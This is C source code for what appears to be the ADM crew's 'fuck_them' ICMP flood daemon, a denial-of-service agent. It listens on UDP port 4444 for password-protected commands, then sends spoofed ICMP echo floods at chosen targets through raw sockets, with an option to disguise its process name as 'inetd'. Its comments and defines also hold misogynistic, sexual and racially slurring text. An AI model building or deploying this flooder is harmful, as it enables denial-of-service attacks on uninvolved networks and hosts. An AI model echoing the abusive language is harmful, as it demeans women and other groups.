/*
   [ Fuck Them ! yeah!!! ]
   [ the new dirty icmp flooder tools ] 
   [ daemon,client n more ( hax the chix for ya!!) ]
 */
/***************************************************************************/
/*   the 3xF                                                               */
/*   find`em  fuck`em <-- really important --> forget`em                   */
/*   ya trust me it's the only way :>                                      */
/*   3xf (girlz);      <--- patch your code !!!                            */
/*   The w0red ADM Crew ;)                                                 */
/***************************************************************************/


#define  VERSION "the fuqn beta private n more #@$@#"
#define  HEIKE  (void)-1	/* ya forget em ;) */
#define  WTF    "where iz muh crazy-b bitch !@#!??? :<"
#define  PROJECT "the ADM tools project"
#define  GAL    0
#ifdef   GAL
#define  d00d_i_know_too_much_of_eleet_girlz 666
#endif
#define  HAX_IN_PROGRESS  A_GIRL /* or som1 else watever? */
#define  BENBE  "RALEUR ;)"
#define  MDP    "takezizmofo"
#define  HOWMANY    255
#define  PORT       4444
#define  SOmEtHiNg "Muh kbd is shity !%@#$"
#define  EASTCOAST "?"
#define  DA_ADM_GAL "netg sistah"
#define  MUHNIGGAH "joeweeeeeee ;)"
#define  THEGOOD   "plgz!"
#define  gabber    "dam dam dam dam damdamdamdam"
#define  CREDITS   "my Crew ,the w00w00 tang clan ;)"
#define  QUOTE     "<DiGiT> OH, PIMP GOD OF THE SKY'S PLEASE IN YOUR WISDOM LET US GAIN ACCESS TO MANY MANY PUSSY\'S"
#define PROGNAME   "inetd "

#include "../lib/icmpspoof.c"
#include <fcntl.h>

unsigned long host2ip (char *);
struct floodz
  {
    u_long saddr;
    u_long daddr;
    char wtf;
    int h0wmanyz;
    u_short size;
  };

/* fuqn [r] prym */

struct floodz fuqnicmp[HOWMANY];

/*******************************
int
gimmefloodz ()
{
  int i;
  for (i = 0; i < HOWMANY; i++)
    if (fuqnicmp[i].wtf == 0)
      return (i);
  return (-1);
}

void
stopfloodz ()
{
  int i;
  for (i = 0; i < HOWMANY; i++)
    fuqnicmp[i].wtf = 0;
}

int
allouefloodz (char *buf)
{
  int i;
  char *buf_mdp = calloc (1, strlen (buf) + 1);
  char *buf_option = calloc (1, strlen (buf) + 1);
  char *buf_ipsrc = calloc (1, strlen (buf) + 1);
  char *buf_ipdst = calloc (1, strlen (buf) + 1);
  char *buf_size = calloc (1, strlen (buf) + 1);
  char *buf_num = calloc (1, strlen (buf) + 1);

 

  if (buf[0] == 'E' || buf[0] == 'e')
    {
      sscanf (buf, "%s %s %s %s %s %s",
	      buf_option,
	      buf_mdp,
	      buf_ipsrc,
	      buf_ipdst,
	      buf_size,
	      buf_num);

      if (strncmp (buf_mdp, MDP, strlen (MDP)) == 0)
	if ((i = gimmefloodz ()) != -1)
	  {
	    if ((fuqnicmp[i].saddr = host2ip (buf_ipsrc)) == -1)
	      return (-1);
	    if ((fuqnicmp[i].daddr = host2ip (buf_ipdst)) == -1)
	      return (-1);
	    fuqnicmp[i].size = atoi (buf_size);
	    fuqnicmp[i].h0wmanyz = atoi (buf_num);
	    fuqnicmp[i].wtf = 1;
	    
	    free(buf_mdp);
	    free(buf_option);
	    free(buf_ipsrc);
	    free(buf_ipdst);
	    free(buf_size);
	    free(buf_num);
	    
	    return (i);
	  }
    }

  if (buf[0] == 'S' || buf[0] == 's')
    {
      sscanf (buf, "%s %s", buf_option, buf_mdp);
      if (strncmp (buf_mdp, MDP, strlen (MDP)) == 0)
	stopfloodz ();
      
	    free(buf_mdp);
	    free(buf_option);
	    free(buf_ipsrc);
	    free(buf_ipdst);
	    free(buf_size);
	    free(buf_num);
	    
      return (0);
    }
  
	    free(buf_mdp);
	    free(buf_option);
	    free(buf_ipsrc);
	    free(buf_ipdst);
	    free(buf_size);
	    free(buf_num);
	    
  return (-1);
}

unsigned long
host2ip (char *serv)
{
  struct sockaddr_in sinn;
  struct hostent *hent;

  hent = gethostbyname (serv);
  if (hent == NULL)
    return (-1);
  memset ((char *) &sinn,0, sizeof (sinn));
  memcpy ((char *) &sinn.sin_addr, hent->h_addr, hent->h_length);
  return (sinn.sin_addr.s_addr);
}
**************************/

int gimmefloodz  ( void  );
void stopfloodz  ( void  );
int allouefloodz ( char *);

int
main (int argc, char **argv)
{
  struct sockaddr_in sin;
  unsigned char buffer[4096];
  unsigned char bufrecv[1024];

  
  int a, s, srv, i = 1;
  int len = sizeof (sin);
  memset (buffer, 0, sizeof (buffer));
  memset (bufrecv, 0, sizeof (bufrecv));

  printf ("-=* The ADM Crew *=-\n");
  printf ("fuck_them icmp daemon DoS\n fuck_them version:%s\n", VERSION);
  printf ("it's time to pray !$*&$@! \n%s\n", QUOTE);
  printf ("ok let's be insane :>~\n");
 
/* strcpy(argv[0],PROGNAME); */ /* unconment that if u want :> */
/* i know it's krad ;) (so.. that works anyway ;)  	       */
/* but i'm too lazy for find a ElEetCodErZTekNiK 	       */
/* so make what you want ;)  				       */ 

  if ((srv = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
    {
      fprintf (stderr, "failed to open udp socket...\n");
      exit (-1);
    }

  if ((s = socket (AF_INET, SOCK_RAW, 255)) == -1)
    {
      fprintf (stderr, "cant open raw socket\n");
      exit (-1);
    }

#ifdef IP_HDRINCL
  if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, (char *) &i, sizeof (i)) == -1)
    {
      fprintf (stderr, "cant set IP_HDRINCL\n");
      close (s);
      exit (-1);
    }
#endif

  for (a = 0; a < HOWMANY; a++)
    {

      fuqnicmp[a].saddr = (u_long) 0;
      fuqnicmp[a].daddr = (u_long) 0;
      fuqnicmp[a].wtf = (char) 0;
      fuqnicmp[a].size = (u_short) 0;
    }



  sin.sin_family = AF_INET;
  sin.sin_addr.s_addr = htonl (INADDR_ANY);
  sin.sin_port = htons (PORT);

  if (bind (srv, (struct sockaddr *) &sin, len) == -1)
    {
      fprintf (stderr, "bind failed...\n");
      exit (-1);
    }

  if ((fcntl (srv, F_SETFL, O_NONBLOCK)) == -1)
    {
      fprintf (stderr, "fcntl failed...\n");
      exit (-1);
    }

  if (fork () == 0)
    {
      while (1)
	{
	  if (recvfrom (srv, bufrecv, 1023, 0, (struct sockaddr *) &sin, &len) != -1)
	    {
	    /*  printf ("%s", bufrecv);  */ /* DEBUG */ 
	      allouefloodz ((char *) &bufrecv);
	      memset (bufrecv, 0, 1024);
	    }

	  for (i = 0; i < HOWMANY; i++)
	    {
	      if (fuqnicmp[i].wtf == 1)
		{
		  icmp_echo (s, fuqnicmp[i].saddr, fuqnicmp[i].daddr, 31337, 414, buffer, fuqnicmp[i].size);
		  fuqnicmp[i].h0wmanyz--;
		}
	      if (fuqnicmp[i].h0wmanyz < 0 || fuqnicmp[i].h0wmanyz == 0)
		fuqnicmp[i].wtf = 0;
	    }
	  usleep (200000);
	}
    }
 exit (0);
}


int
gimmefloodz ()
{
  int i;
  for (i = 0; i < HOWMANY; i++)
    if (fuqnicmp[i].wtf == 0)
      return (i);
  return (-1);
}

void
stopfloodz ()
{
  int i;
  for (i = 0; i < HOWMANY; i++)
    fuqnicmp[i].wtf = 0;
}

int
allouefloodz (char *buf)
{
  int i;
  char *buf_mdp = calloc (1, strlen (buf) + 1);
  char *buf_option = calloc (1, strlen (buf) + 1);
  char *buf_ipsrc = calloc (1, strlen (buf) + 1);
  char *buf_ipdst = calloc (1, strlen (buf) + 1);
  char *buf_size = calloc (1, strlen (buf) + 1);
  char *buf_num = calloc (1, strlen (buf) + 1);

 

  if (buf[0] == 'E' || buf[0] == 'e')
    {
      sscanf (buf, "%s %s %s %s %s %s",
	      buf_option,
	      buf_mdp,
	      buf_ipsrc,
	      buf_ipdst,
	      buf_size,
	      buf_num);

      if (strncmp (buf_mdp, MDP, strlen (MDP)) == 0)
	if ((i = gimmefloodz ()) != -1)
	  {
	    if ((fuqnicmp[i].saddr = host2ip (buf_ipsrc)) == -1)
	      return (-1);
	    if ((fuqnicmp[i].daddr = host2ip (buf_ipdst)) == -1)
	      return (-1);
	    fuqnicmp[i].size = atoi (buf_size);
	    fuqnicmp[i].h0wmanyz = atoi (buf_num);
	    fuqnicmp[i].wtf = 1;
	    
	    free(buf_mdp);
	    free(buf_option);
	    free(buf_ipsrc);
	    free(buf_ipdst);
	    free(buf_size);
	    free(buf_num);
	    
	    return (i);
	  }
    }

  if (buf[0] == 'S' || buf[0] == 's')
    {
      sscanf (buf, "%s %s", buf_option, buf_mdp);
      if (strncmp (buf_mdp, MDP, strlen (MDP)) == 0)
	stopfloodz ();
      
	    free(buf_mdp);
	    free(buf_option);
	    free(buf_ipsrc);
	    free(buf_ipdst);
	    free(buf_size);
	    free(buf_num);
	    
      return (0);
    }
  
	    free(buf_mdp);
	    free(buf_option);
	    free(buf_ipsrc);
	    free(buf_ipdst);
	    free(buf_size);
	    free(buf_num);
	    
  return (-1);
}

unsigned long
host2ip (char *serv)
{
  struct sockaddr_in sinn;
  struct hostent *hent;

  hent = gethostbyname (serv);
  if (hent == NULL)
    return (-1);
  memset ((char *) &sinn,0, sizeof (sinn));
  memcpy ((char *) &sinn.sin_addr, hent->h_addr, hent->h_length);
  return (sinn.sin_addr.s_addr);
}
